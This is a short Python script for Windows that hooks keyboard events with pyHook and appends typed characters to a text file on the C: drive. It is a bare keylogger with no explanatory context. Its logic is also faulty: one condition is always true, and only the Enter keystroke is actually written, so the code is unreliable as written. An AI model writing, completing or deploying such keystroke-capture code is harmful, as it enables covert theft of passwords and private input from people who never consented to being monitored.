import win32api, sys, pythoncom, pyHook

buffer = ''

def OnKeyboardEvent(event):
	if event.Ascii == 5:
		sys.exit()

	if event.Ascii != 0 or 8:
		f = open ('c:\\output.txt', 'a')
		keylogs = chr(event.Ascii)

	if event.Ascii == 13:
		keylogs = keylogs + '\n'
		f.write(keylogs)
		f.close()

while True:
	hm = pyHook.HookManager() 
	hm.KeyDown = OnKeyboardEvent 
	hm.HookKeyboard() 
	pythoncom.PumpMessages()